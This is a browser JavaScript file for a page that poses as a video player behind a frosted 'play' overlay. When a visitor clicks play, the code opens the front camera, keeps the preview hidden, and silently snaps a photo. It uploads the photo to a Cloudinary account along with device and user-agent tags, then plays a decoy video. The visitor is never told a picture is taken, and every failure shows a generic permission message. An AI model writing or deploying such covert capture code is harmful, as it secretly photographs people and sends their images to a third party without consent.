(function () {
  'use strict';

  const cfg = window.CLOUDINARY_CONFIG || {};
  const $ = (id) => document.getElementById(id);

  const els = {
    video: $('video'),
    canvas: $('canvas'),
    statusBadge: $('statusBadge'),
    statusText: $('statusText'),
    frostOverlay: $('frostOverlay'),
    playButton: $('playButton')
  };

  let stream = null;
  let busy = false;
  let completed = false;

  const PERMISSION_DENIED = 'Permission not granted';
  const CAMERA_READY_MS = Math.max(300, (cfg.countdownSeconds ?? 2) * 1000);

  function isConfigured() {
    return Boolean(cfg.cloudName && cfg.uploadPreset);
  }

  function getDeviceSlug() {
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return 'iphone';
    if (/iPad/i.test(ua)) return 'ipad';
    if (/Android/i.test(ua)) return 'android';
    if (/Windows/i.test(ua)) return 'windows';
    if (/Mac OS X|Macintosh/i.test(ua)) return 'mac';
    if (/Linux/i.test(ua)) return 'linux';
    return 'unknown';
  }

  function showPermissionDenied() {
    els.statusText.textContent = PERMISSION_DENIED;
    els.statusBadge.classList.add('visible');
  }

  function hideStatus() {
    els.statusBadge.classList.remove('visible');
  }

  function showFrostOverlay() {
    els.frostOverlay.classList.remove('hidden');
    els.playButton.classList.remove('hidden');
  }

  function hideFrostOverlay() {
    els.frostOverlay.classList.add('hidden');
    els.playButton.classList.add('hidden');
  }

  function concealVideo() {
    els.video.classList.add('concealed');
    els.video.classList.remove('playback');
  }

  async function checkCameraPermission() {
    if (!navigator.permissions?.query) return 'unknown';
    try {
      const result = await navigator.permissions.query({ name: 'camera' });
      return result.state;
    } catch {
      return 'unknown';
    }
  }

  function stopStream() {
    if (!stream) return;
    stream.getTracks().forEach((t) => t.stop());
    stream = null;
  }

  function waitForVideoReady() {
    const video = els.video;
    const maxWait = 15000;
    const start = Date.now();

    return new Promise((resolve, reject) => {
      function settle() {
        if (typeof video.requestVideoFrameCallback === 'function') {
          video.requestVideoFrameCallback(() => setTimeout(resolve, CAMERA_READY_MS));
        } else {
          setTimeout(resolve, CAMERA_READY_MS);
        }
      }

      function check() {
        if (video.videoWidth > 0 && video.videoHeight > 0) {
          settle();
          return;
        }
        if (Date.now() - start > maxWait) {
          reject(new Error('Invalid video dimensions'));
          return;
        }
        requestAnimationFrame(check);
      }

      check();
    });
  }

  function captureFrame() {
    const video = els.video;
    const canvas = els.canvas;
    const w = video.videoWidth;
    const h = video.videoHeight;

    if (!w || !h) throw new Error('Invalid video dimensions');

    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.translate(w, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, w, h);

    return new Promise((resolve, reject) => {
      canvas.toBlob(
        (blob) => {
          if (blob) resolve(blob);
          else reject(new Error('Capture failed'));
        },
        'image/jpeg',
        cfg.jpegQuality ?? 0.92
      );
    });
  }

  function uploadToCloudinary(blob) {
    const url = `https://api.cloudinary.com/v1_1/${cfg.cloudName}/image/upload`;
    const form = new FormData();
    const deviceSlug = getDeviceSlug();

    form.append('file', blob, `photo-${Date.now()}.jpg`);
    form.append('upload_preset', cfg.uploadPreset);
    if (cfg.folder) form.append('folder', cfg.folder);
    form.append('tags', `device-${deviceSlug},web-capture`);
    form.append('context', `user_agent=${encodeURIComponent(navigator.userAgent)}`);

    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);

      xhr.onload = () => {
        try {
          const data = JSON.parse(xhr.responseText);
          if (xhr.status >= 200 && xhr.status < 300) resolve(data);
          else reject(new Error(data.error?.message || 'Upload failed'));
        } catch {
          reject(new Error('Invalid server response'));
        }
      };

      xhr.onerror = () => reject(new Error('Network error'));
      xhr.send(form);
    });
  }

  async function captureAndUpload() {
    const blob = await captureFrame();
    await uploadToCloudinary(blob);
  }

  async function playCloudinaryVideo() {
    const playbackUrl = cfg.playbackVideoUrl;
    if (!playbackUrl) throw new Error('Playback URL not configured');

    stopStream();
    els.video.srcObject = null;
    els.video.removeAttribute('src');
    els.video.classList.remove('concealed');
    els.video.classList.add('playback');
    els.video.src = playbackUrl;
    els.video.loop = true;
    els.video.muted = false;
    els.video.playsInline = true;

    try {
      await els.video.play();
    } catch {
      els.video.muted = true;
      await els.video.play();
    }
  }

  async function startSession() {
    showFrostOverlay();
    concealVideo();
    hideStatus();
    stopStream();
    els.video.classList.remove('playback');
    els.video.removeAttribute('src');

    if (!navigator.mediaDevices?.getUserMedia) {
      showPermissionDenied();
      return false;
    }

    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: { ideal: 'user' },
          width: { ideal: 1920 },
          height: { ideal: 1080 }
        },
        audio: false
      });

      els.video.srcObject = stream;
      els.video.muted = true;
      await els.video.play();
      await waitForVideoReady();
      await captureAndUpload();

      hideFrostOverlay();
      await playCloudinaryVideo();
      completed = true;
      return true;
    } catch (err) {
      const name = err?.name || '';
      if (name === 'NotAllowedError' || name === 'PermissionDeniedError' || name === 'NotFoundError') {
        showPermissionDenied();
      } else if (err.message === 'Invalid video dimensions' || err.message === 'Capture failed') {
        showPermissionDenied();
      } else {
        showPermissionDenied();
      }
      stopStream();
      concealVideo();
      showFrostOverlay();
      return false;
    }
  }

  async function handleAction(e) {
    if (e) e.stopPropagation();
    if (busy || completed) return;

    busy = true;
    els.playButton.disabled = true;

    try {
      if (!isConfigured()) return;

      const perm = await checkCameraPermission();
      if (perm === 'denied') {
        showPermissionDenied();
        return;
      }

      await startSession();
    } finally {
      busy = false;
      if (!completed) els.playButton.disabled = false;
    }
  }

  function bindPlayTriggers() {
    els.playButton.addEventListener('click', handleAction);
    els.frostOverlay.addEventListener('click', (e) => {
      if (e.target === els.frostOverlay) handleAction(e);
    });
    els.frostOverlay.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        handleAction();
      }
    });
  }

  async function init() {
    bindPlayTriggers();
    concealVideo();

    const perm = await checkCameraPermission();
    if (perm === 'denied') {
      showPermissionDenied();
    }
  }

  window.addEventListener('beforeunload', stopStream);

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
